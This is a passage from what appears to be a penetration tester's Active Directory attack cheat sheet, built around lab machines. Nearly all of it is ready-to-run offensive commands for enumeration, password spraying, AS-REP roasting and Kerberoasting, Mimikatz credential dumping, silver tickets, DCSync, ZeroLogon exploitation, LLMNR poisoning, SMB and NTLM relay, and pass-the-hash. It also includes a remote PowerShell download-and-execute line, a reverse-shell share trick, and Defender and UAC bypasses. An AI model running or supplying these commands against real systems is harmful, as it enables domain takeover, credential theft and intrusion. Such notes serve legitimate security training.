Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-user1                                                                      Retrieve users which are in a local group of a machine using GPO
Get-DomainGPOUserLocalGroupMapping -Identity user1 -Verbose                                                                               Retrieve machines where the given user is member of a specific group
Get-DomainOU                                                                                                                              Retrieve OUs in a domain
Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}"                                                                          Retrieve GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
Find-LocalAdminAccess -Verbose                                                                                                            Find all machines on the current domain where the current user has local admin access
Find-DomainUserLocation -CheckAccess                                                                                                      Find computers where a domain admin session is available and current user has admin access
Find-DomainUserLocation -Stealth                                                                                                          Find computers where a domain admin session is available


Get details, in this case, about user svc__apache
-------------------------------------------------
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description                                                                Check for non-empty descriptions of domain users


Object Permissions Enumeration
------------------------------
Get-ObjectAcl -Identity <username>                                                                                                        Enumerate ACEs
Convert-SidToName <SID>                                                                                                                   Convert ObjectISD and SecurityIdentifier into names
"<SID>", "<SID>", "<SID>", "<SID>", ... | Convert-SidToName                                                                               Convert <SID>s into names
Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerat ACLs for <group>, only display values equal to GenericAll


Domain Shares Enumeration
-------------------------
Find-DomainShare
Invoke-ShareFinder -verbose


Get a list of users in the current domain
-----------------------------------------
Get-DomainUser
Get-DomainUser -Identity user1


Get list of all properties for users in the current domain
----------------------------------------------------------
Get-DomainUser -Identity user1 -Properties *
Get-DomainUser -Properties samaccountname,logonCount


Get a list of computers in the current domain
----------------------------------------------
Get-DomainComputer | select Name
Get-DomainComputer -OperatingSystem "*Server 2022*"
Get-DomainComputer -Ping


Get all the groups in the current domain
----------------------------------------
Get-DomainGroup | select Name
Get-DomainGroup -Domain <targetdomain>


Get list of GPO in current domain
---------------------------------
Get-DomainGPO
Get-DomainGPO -ComputerIdentity dcorp-user1


ACL Enumeration
---------------
Get-DomainObjectAcl -SamAccountName user1 -ResolveGUIDs                                                                                                    Retrieve the ACLs associated with the specified object
Get-DomainObjectAcl -SearchBase "LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose                               Retrieve the ACLs associated with the specified prefix to be used for search
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access                                                                       Enumerate ACLs using ActiveDirectory module but without resolving GUIDs
Find-InterestingDomainAcl -ResolveGUIDs                                                                                                                    Search for interesting ACEs
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"                                                                                           Retrieve the ACLs associated with the specified path


Get a list of all domain trusts for the current domain
------------------------------------------------------
Get-DomainTrust
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local


Forest mapping
--------------
Get-Forest                                   Retrieve details about the current forest, specify a Forest with -Forest domain.local
Get-ForestDomain                             Retrieve all domains in the current forest, specify a Forest with -Forest domain.local
Get-ForestGlobalCatalog                      Retrieve all global catalogs for the current forest, specify a Forest with -Forest domain.local
Get-ForestTrust                              Map trusts of a forest, specify a Forest with -Forest domain.local


Find computers where a domain admin, a specified user or group has sessions
---------------------------------------------------------------------------
Find-DomainUserLocation -Verbose
Find-DomainUserLocation -UserGroupIdentity "RDPUsers"

```
- See also [PowerView-3.0-tricks.ps1](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993), [HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview) and [HarmJ0y](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

#### [ADModule](https://github.com/samratashok/ADModule)

```
Import it
---------
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1


Misc
----
Get-ADDomainController                                                                                 Retrieve domain controllers for the current domain
Get-ADDomainController -DomainName moneycorp.local -Discover                                           Retrieve domain controllers for another domain
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description     Check for non-empty descriptions of domain users
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name                                               Retrieve all groups containing the word "admin" in group name
Get-ADGroupMember -Identity "Domain Admins" -Recursive                                                 Retrieve all the members of the Domain Admins group
Get-ADPrincipalGroupMembership -Identity user1                                                         Retrieve the group membership for a user


Get a list of users in the current domain
-----------------------------------------
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *


Get list of all properties for users in the current domain
----------------------------------------------------------
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}


Get a list of computers in the current domain
----------------------------------------------
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}


Get all the groups in the current domain
----------------------------------------
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties *


Get a list of all domain trusts for the current domain
------------------------------------------------------
Get-ADTrust
Get-ADTrust -Identity us.dollarcorp.moneycorp.local


Forest mapping
--------------
Get-ADForest                                                            Retrieve details about the current forest, specify a Forest with -Identity eurocorp.local
(Get-ADForest).Domains                                                  Retrieve all domains in the current forest
Get-ADForest | select -ExpandProperty GlobalCatalogs                    Retrieve all global catalogs for the current forest
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'             Map trusts of a forest

```

#### [Invoke-SessionHunter](https://github.com/Leo4j/Invoke-SessionHunter)
```
Invoke-SessionHunter -FailSafe
Invoke-SessionHunter -NoPortScan -Targets C:\Documents\servers.txt
```


#### From a compromised machine
MMC
  1. Search Bar > Type `mmc` and press enter
  2. See the steps for this app in https://tryhackme.com/room/adenumeration Task 3
Command Prompt
  - `net user /domain`
  - `net user zoe.marshall /domain`
  - `net group /domain`
  - `net group "Tier 1 Admins" /domain`
  - `net accounts /domain`
PowerShell
  - `Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *`
  - `Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A`
  - `Get-ADGroup -Identity Administrators -Server za.tryhackme.com -Properties *`
  - `Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com`
  - `Get-ADGroupMember -Identity "Tier 2 Admins" | Select-Object Name, SamAccountName, DistinguishedName`
  - `$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)`
  - `Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com`
  - `Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com`
  - `Get-ADDomain -Server za.tryhackme.com`
  - `Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
BloodHound`

#### More enumeration

**AD User**
- `Get-ADUser -identity s.smith -properties *`
- If part of Audit Share, see the share `NETLOGON`
- Check the value in `ScriptPath`, they should be available in `NETLOGON`

**Kerberos user enumeration**
- `/home/kali/Documents/windows-attack/active_directory/kerbrute/kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.159.49 usernames.txt`

**Server Manager**
- See event logs with: Event Viewer
- Navigate to the tools tab and select the Active Directory Users and Computers

**Misc**
Always enumerate first, do not grab the low hanging fruit first, since it might be a decoy. Also check logon count and login policy.
- An example: run `Get-DomainUser | select samaccountname, logonCount`, if you see an account that seems like a low hanging fruit but has zero logons, it might be a decoy or a dorment user.
- Check: `logonCount`, `lastlogontimestamp`, `badpasswordtime`, `Description`
- Take also in consideration your target organization: is this their first assesment? Do they invest in their security (time, effort)?


#### <ins>SMB</ins>
enumeration
- `enum4linux -a -u "" -p "" 192.168.180.21`
- `enum4linux -a -u "Guest" -p "" 192.168.180.21`
- `sudo nmap -vvv -p 137 -sU --script=nbstat.nse 192.168.249.55`
- `nmap -vvv -p 139,445 --script=smb* 192.168.180.21`
- `crackmapexec smb 192.168.180.21 -u 'guest' -p ''`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --shares`
  - see anon logins
  - use flags `--shares` and `--rid-brute`
- `crackmapexec smb 192.168.174.175 -u 'guest' -p ''`
  - see anon logins
  - use flags `--shares` and `--rid-brute` (`SidTypeUser` are users)
- `smbmap -H 192.168.249.55`
- `smbclient \\\\\192.168.249.55\\`
- `smbclient -U '' -L \\\\\192.168.220.240\\`
- `smbclient --no-pass -L //192.168.174.175`
- `smbclient -L //192.168.174.175 -N`
- `impacket-lookupsid vulnnet-rst.local/guest@10.10.146.39 > usernames.txt`
- `cat usernames.txt | grep -i user | awk -F \\'{print $$2}' | awk '{print $1}'`	

connect to share
- `smbclient //192.168.207.116/IPC$`
- `smbclient \\\\\192.168.212.172\\Shenzi`
- `smbclient //192.168.203.172/DocumentsShare -U CRAFT2/thecybergeek`
- If you find a suspicious share, try to upload a lnk file
  - create a shortcut with the command for a reverse shell with `powercat.ps1`
  - `cp link.lnk \\192.168.212.172\DocumentsShare`

mount a share
- `mount -t cifs "//10.10.10.103/Department Shares" /mnt`
  `mount -t cifs -o username=amanda,password=Ashare1972 "//10.10.10.103/CertEnroll" /mnt`
  - from the mounted share, see write perms:
    `find . -type d | while read directory; do touch ${directory}/0xdf 2>/dev/null && echo "${directory} - write file" && rm ${directory}/0xdf; mkdir ${directory}/0xdf 2>/dev/null && echo "${directory} - write directory" && rmdir ${directory}/0xdf; done`
  - see deleted files:
    `touch {/mnt/ZZ_ARCHIVE/,./}0xdf.{lnk,exe,dll,ini}`

exploitation
- check if this smb hosts files of the web service, it might be possible to upload a shell
- maybe it's possible to do phishing
- `nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 192.168.174.187`
  - CVE-2017-0143 EternalBlue
  
change password
- If you find 'STATUS_PASSWORD_MUST_CHANGE': `smbpasswd -r $IP -U sbradley`
- Alternativa: `impacket-smbpasswd -newpass testing1234 sbradley:roastpotatoes@10.10.95.8`


#### <ins>RPC</ins>
- `rpcclient 192.168.180.20 -N`
- `rpcclient 192.168.174.187 -U nik`
- `rpcclient -U "" -N 10.10.10.172`
- Commands: `enumdomusers`, `enumdomgroups`, `querydispinfo`
  - `cat rpc_dump | awk '{print $1}' | cut -f2 -d [ | cut -f1 -d ] > ad_users.txt`
  - After `enumdomusers`, notes the `rid` values, then
    `queryuser RID-HERE`, example `queryuser 0x1f4`
- `impacket-rpcdump @192.168.180.21`
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
- Reset password: (see for `svc_helpdesk` accounts)
  `setuserinfo2 username 23 password`



#### <ins>Azure</ins>
- https://blog.xpnsec.com/azuread-connect-for-redteam/
- https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html


#### <ins>LDAP</ins>

- `ldapsearch -v -x -b "DC=resourced,DC=local" -H "ldap://192.168.174.187" "(objectclass=*)"`
  - check descriptions (you might find passwords in descriptions), enumerate users
- `ldapsearch -v -c -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.212.175 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
  - to find Administrator password
  - using creds `fmcsorley:CrabSharkJellyfish192` for domain `HUTCH.OFFSEC`
- `ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o ~/Downloads/ldap/`

Domain Enumeration
1. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172`
2. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172 -U --admin-objects`
   - Use the flag `--full` to get full results
3. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt`
- You can also see wich elements belongs in a group
  - `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172 -U -m "Remote Management Users"`
- Find possible passwords
  - `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.182 -U --full | grep 'Pwd'`

#### <ins>PsLoggedOn</ins>

Download: [PsLoggedOn - Sysinternals | Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon)
```
.\PsLoggedon.exe \\COMPUTERNAME       See user logons at COMPUTERNAME
```

#### <ins>Service Principal Names Enumeration</ins>

```
setspn -L <username>                                                List the SPNs connected to a certain user account
Get-NetUser -SPN | select samaccountname,serviceprincipalname       List the SPNs accounts in the domain
```

#### <ins>Object Permissions Enumeration</ins>=
```
Get-ObjectAcl -Identity <username>                                                                                                        Enumerate ACEs
Convert-SidToName <SID>                                                                                                                   Convert ObjectISD and SecurityIdentifier into names
"<SID>", "<SID>", "<SID>", "<SID>", ... | Convert-SidToName                                                                               Convert <SID>s into names
Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerat ACLs for <group>, only display values equal to GenericAll
```

#### <ins>Domain Shares Enumeration</ins>

```
Find-DomainShare       Find Domain Shares
```

#### <ins>SharpHound</ins>

```
Import-Module .\Sharphound.ps1                                                                  Import SharpHound; https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
Get-Help Invoke-BloodHound                                                                      Learn more about Invoke-BloodHound; To run SharpHound you must first start BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory <DIR> -OutputPrefix "corp audit"       Collect domain data
Invoke-Bloodhound -CollectionMethod All -Domain domain.local -ZipFileName file.zip
```

Alternatives
- `python3 /home/kali/Documents/windows-attack/Scripts/BloodHound.py/bloodhound.py -d heist.offsec -u enox -p california -c all -ns 192.168.212.165`
- `.\SharpHound.exe -c All -d CONTROLLER.local --zipfilename loot.zip`
- `SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs`

#### <ins>BloodHound</ins>

- Note: you need to start Neo4j first with `sudo neo4j start` and then use the command `bloodhound` to start BloodHound.
- Default credentials for Neo4j: `neo4j:neo4j`
- Log in BloodHound with Neo4j's credentials
- Upload here the zip created with SharpHound
- Pre-built queries
  - Find Workstations where Domain Users can RDP
  - Find Servers where Domain Users can RDP
  - Find Computers where Domain Users are Local Admin
  - Shortest Path to Domain Admins from Owned Principals
- Custom queries
  - `MATCH (m:Computer) RETURN m`  to display all computers
  - `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p` to display all active sessions
- Try every query
  - See the groups of the user pwned, query 'Shortest Path to High Value targets'
  - Active Directory security groups: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators
  - Search for the users / machines owned and mark them as it. Then use the query 'Reachable High Value Targets'


#### <ins>Mimikatz</ins>

After starting `mimikatz.exe`, run the command `privilege::debug` to enable `SeDebugPrivilege` and run `token::elevate`
```
sekurlsa::logonpasswords                                                           Dump the credentials of all logged-on users
sekurlsa::tickets                                                                  Tickets stored in memory
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell       Overpass the Hash
sekurlsa::msv                                                                      Extracting NTLM hashes from LSASS memory
crypto::capi                                                                       Make non-exportable keys exportable; CryptoAPI function
crypto::cng                                                                        Make non-exportable keys exportable; KeyIso service
lsadump::dcsync /user:<domain>\<user>                                              Domain Controller Synchronization
lsadump::lsa /patch                                                                Dump the hashes
```

Other commands to run
- `log`
- `lsadump::sam`
- `lsadump::secrets`
- `lsadump::cache`
- `lsadump::ekeys`

Notes
- If `privilege::debug` doesn't work, try with:
  - `. .\Invoke-PsUACme.ps1`
  - `Invoke-PsUACme -method oobe -Payload "powershell -ExecutionPolicy Bypass -noexit -file C:\temp\mimikatz.exe"`
- You can: steal credentials, generate Kerberos tickets, dump credentials stored in memory and leverage attacks
- A few attacks: Credential dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket
- See https://github.com/gentilkiwi/mimikatz/wiki
- The first thing to do is always to run `privilege::debug`
- See: https://github.com/drak3hft7/Cheat-Sheet---Active-Directory
- With mimikatz you can turn on the feature widgets. It enables you to see then password in plain text for users that logon and log off
- See also `Invoke-Mimikatz`
- Use `/patch` with a command, it might work
   - esempio: `lsadump::sam /patch`
- https://adsecurity.org/?page_id=1821
- You can also run commands like this: `.\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit`, especially if you see the prompt going nuts


#### <ins>Active Directory Authentication Attacks</ins>

#### Password Attacks

With LDAP and ADSI
- Before any attack, check `net accounts` to learn more about account lockouts
- Use the script [Spray-Passwords.ps1](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)
  - Search wich user has the password `SecretPass123!` with `.\Spray-Passwords.ps1 -Pass SecretPass123! -Admin`
  - Remember to run `powershell -ep bypass` before using scripts

Leveraging SMB
- `crackmapexec smb <IP> -u users.txt -p 'SecretPass123!' -d <domain-name> --continue-on-success` Password spraying
- `crackmapexec smb <domain_name>/<username>:'abd132' -M targets.txt` Spray a specified password `abd132` against all domain joined machines contained in `targets.txt`
- Note: this doesn't take in consideration the password policy of the domain

By obtaining a TGT
- It's possible to use kinit to obtain and cache a Kerberos TGT and automate the process with a script
- It's also possible to use [kerbrute](https://github.com/ropnop/kerbrute) instead
  - `.\kerbrute_windows_amd64.exe passwordspray -d <domain-name> .\usernames.txt "SecretPass123!"`

#### AS-REP Roasting

On Linux
1. `impacket-GetNPUsers -dc-ip <IP-Domain-Controller> -request -outputfile <outuput_file.asreproast> <domain>/<user>` perform AS-REP roasting
2. crack the AS-REP hash
   - `sudo hashcat -m 18200 outuput_file.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` 
   - `john --wordlist=/usr/share/wordlists/rockyou.txt kerberos-users-found`

On Windows
1. With [Rubeus](https://github.com/GhostPack/Rubeus), `.\Rubeus.exe asreproast /nowrap` perform AS-REP roasting
2. crack the AS-REP hash
   - `sudo hashcat -m 18200 outuput_file.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` 
   - `john --wordlist=/usr/share/wordlists/rockyou.txt kerberos-users-found`

Alternatives
- From the already hacked machine
  - https://github.com/HarmJ0y/ASREPRoast
  - `. .\ASREPRoast.ps1`
  - `Get-ASREPHash -Domain megacorp.local -Username jorden`
- `UF_DONT_REQUIRE_PREAUTH`
  - https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#get-as-rep-hash


#### Kerberoasting

- see: https://github.com/drak3hft7/Cheat-Sheet---Active-Directory#kerberoast
- Note: if you have a service account (like `svc_apache`) it's possible to kerberoast
  - see powerview command `Get-netuser username`

Retrieve TGS
  - `impacket-GetNPUsers -dc-ip 10.10.153.149 THM.red/thm:'Passw0rd!'`
  - `impacket-GetNPUsers vulnnet-rst.local/t-skid:tj072889 -dc-ip 10.10.146.39 -request`
  Alternatives
  - From a compromised machine: `.\Rubeus.exe kerberoast`, `.\Rubeus.exe kerberoast /nowrap` or `.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972`
  - `impacket-GetUserSPNs lab.enterprise.thm/nik:ToastyBoi! -request`
    - you need to add the domain and IP to /etc/hosts to make this command work

Crack the hash
- `hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -O`
- `hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
- Note: you can run commands as another user with `runas` or `Invoke-RunasCs.ps1`
  - `Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/shell.exe'`

#### Silver Tickets

To create a silver ticket, you need:
- SPN password hash
- Domain SID
- Target SPN

1. With mimikatz, run the commands `privilege::debug` and `sekurlsa::logonpasswords` to extract cached AD credentials. Note the NTLM hash of the target user
2. Run on the PowerShell the command `whoami /user` to obtain the domain SID (omit the last 4 digits). Note: you should be able to find it also in the previous step
3. Target an SPN
4. Run `kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:<TARGET> /service:<SERVICE> /rc4:<NTLM-HASH> /user:<USER>`
5. Confirm that you have the ticket ready to use in memory with `klist`

**Another way to do it**
1. `impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator`
2. `export KRB5CCNAME=$PWD/Administrator.ccache`
3. `klist`
4. `sudo nano /etc/krb5user.conf`
5. `sudo echo '127.0.0.1       localhost nagoya.nagoya-industries.com NAGOYA-INDUSTRIES.COM' >> /etc/hosts`
6. `impacket-mssqlclient -k nagoya.nagoya-industries.com`
   - `select system_user;`
   - `SELECT * FROM OPENROWSET (BULK 'c:\users\administrator\desktop\proof.txt', SINGLE_CLOB) as correlation_name;`

- Requirement: running in the context of service user (example `svc_mssql`)
- MSSQL, verify if it's running in the context of service user
  1. from kali: `impacket-smbserver -smb2support share /home/kali/Downloads/`
  2. from mssql: `exec xp_dirtree '\\ATTACKERIP\share'`
  3. from `impacket-smbserver`, see the user that tried to authenticate
  - See 'Nagoya' from PG as an example
- If you have a password, you can generate an NTHASH: https://codebeautify.org/ntlm-hash-generator?utm_content=cmp-true
  - There are many tools for this purpose

#### Domain Controller Synchronization (DCSync)

With Bloodhound, use the query 'Find Principals with DCSync Rights'
- Another way to see wich user can DCSync is to see who possesses 'Replication Righs' with `PowerView.ps1`
  - `Get-ObjectACL "DC=htb,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get') }`

On Linux
1. `impacket-secretsdump -just-dc-user <target-user> <domain>/<user>:"<password>"@<IP>`
2. Crack the NTLM hash with `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

On Windows
1. In mimikatz, run the command `lsadump::dcsync /user:<domain>\<user>`, note the Hash NTLM
2. Crack the NTLM hash with `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

Another way
- with [aclpwn.py](https://github.com/fox-it/aclpwn.py), `python aclpwn.py -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161 -du neo4j -dp neo4j`

Connect with NTLM
- `evil-winrm -u Administrator -H '823452073d75b9d1cf70ebdf86c7f98e' -i 10.10.10.175 -N`
- `impacket-psexec egotistical-bank.local/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e`


#### LDAP Pass-back attack

If you find an endpoint where you can connect back to an arbitrary ldap server
- run `nc -vlp 389`
- Host a Rogue LDAP Server
  1. `sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
  2. `sudo dpkg-reconfigure -p low slapd`
  3. `nano olcSaslSecProps.ldif`
  4. `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
  5. Verify it: `ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`


#### ZeroLogon

- Explanation of ZeroLogon: https://tryhackme.com/room/zer0logon

STEP 1, CHOOSE ONE EXPLOIT
- `python3 '/home/kali/Documents/windows-attack/CVE/ZeroLogon/ZeroLogon by risksense/set_empty_pw.py' DC01 172.16.134.100`
- `python3 '/home/kali/Documents/windows-attack/CVE/ZeroLogon/CVE-2020-1472 Zerologon from SecuraBV/zerologon_tester.py' DC01 192.168.174.187`

STEP 2
- `impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'FABRICORP.LOCAL/FUSE$@10.10.10.193'`
- `impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 MULTIMASTER\$@10.10.10.179`
  - change only `'FABRICORP.LOCAL/FUSE$@10.10.10.193'` >> `DOMAIN/MACHINE$@IP`
  - once secrets are dumped, select users with the following command
    - `awk -F: '{print $1}' hashes.txt | sort | uniq`

STEP 3
- `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
- use also a pass the hash attack for administrator
  - `impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568 Administrator@10.10.169.118`

STEP 4
- RESTORATION: https://github.com/dirkjanm/CVE-2020-1472#restore-steps


#### Responder SSRF

- Setup Responder to create a spoofed WPAD proxy server
  - `sudo responder -I tun0 -wv`
  
  
#### LAPS and PXE

- [Taking over Windows Workstations thanks to LAPS and PXE](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/)
- [PowerPXE](https://github.com/wavestone-cdt/powerpxe)
- [TryHackMe task 6 Breaching AD](https://tryhackme.com/room/breachingad)
1. `tftp -i $IP GET "\Tmp\x64{39...28}.bcd" conf.bcd`
2. `Import-Module .\PowerPXE.ps1`
3. `$BCDFile = "conf.bcd"`
4. `Get-WimFile -bcdFile $BCDFile`
5. `tftp -i $IP GET "<PXE Boot Image Location>" pxeboot.wim`
6. `Get-FindCredentials -WimFile pxeboot.wim`


#### LLMNR Poisoning

- It is possible that when you run nmap, or simply have traffic, you may receive communications. Use responders to capture hashes
1. `sudo responder -I tun0 -rdwv`
2. Listen to the traffic
3. Get the hash
4. crack the hash
   - `hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt -o cracked.txt -O`


#### SMB Relay

- Requirements for attack: SMB signing must be disabled on the target; Relayed user credentials must be admin on the machine.
  - Discovery: `nmap --script=smb2-security-mode.nse -p445 192.168.220.0/24`
1. Turn off SMB and HTTP from the file `/usr/share/responder/Responder.conf`
2. `sudo responder -I tun0 -rdwv`
3. `sudo impacket-ntlmrelayx -tf targets.txt -smb2support`
   - add the flag `-i` to get an interactive smb shell; connect with netcat `nc 127.0.0.1 1100`
   - add the flag `-c` to run a command, like `whoami`
   - add the flag `-e` to execute something, like a payload generated with msfvenom
4. Capture SAM hashes


#### IPv6 DNS Attacks

1. `mitm6 -d domain.local`
2. `sudo impacket-ntlmrelayx -6 -t ldaps://192.168.57.140 -wh fakewpad.domain.local -l lootme`
   - `-t ldaps://DOMAIN-CONTROLLER-IP`; change only the ip in this command
3. see the results in the directory 'lootme' for ntlmrelayx
4. for mitm6, if an admin logs in, it might succed in creating a new user
- See also: [The worst of both worlds: Combining NTLM Relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)


#### MFP Hacking

- See: [How to Hack Through a Pass-Back Attack: MFP Hacking Guide](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)


#### Dump hashes

- `impacket-secretsdump spookysec/backup:backup2517860@10.10.3.105`
- `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`
  - `SYSTEM` is also a file you have to get
    - `SYSTEM` or `system.hive`
- you can also run
  1. `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > hashes.txt`
  2. `cat hashes.txt | cut -d ':' -f 4 > pothashes.txt`
  3. `gedit pothashes.txt`


#### Microsoft password automation decrypt

1. `$pw = "01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b" | ConvertTo-SecureString`
2. `$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)`
3. `$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)`
4. `echo $UnsecurePassword`


#### Full control / Write privileges over a template (ESC4)

1. `certipy-ad req -username jodie.summers -password 'hHO_S9gff7ehXw' -target nara-security.com -ca NARA-CA -template NARAUSER -upn administrator@nara-security.com -dc-ip 192.168.234.30 -debug`
2. `certipy-ad auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 192.168.234.30`


#### WriteDACL

- If you find that your user or the group wich your user is part of has this right, follow these steps
1. `net user john abc123$ /add /domain`
2. `net group "Exchange Windows Permissions" john /add`
3. `net localgroup "Remote Management Users" john /add`
4. `When using evil-winrm, run the command 'Bypass-4MSI' to evade defender`
5. `iex(new-object net.webclient).downloadString('http://10.10.14.30/PowerView.ps1')`
6. `$pass = convertto-securestring 'abc123$' -asplain -force`
7. `$cred = new-object system.management.automation.pscredential('htb\john', $pass)`
8. `Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync`
9. Proceed with DCSync using `john:abc123$`


#### Azure AD (AAD) Sync service

- See: 
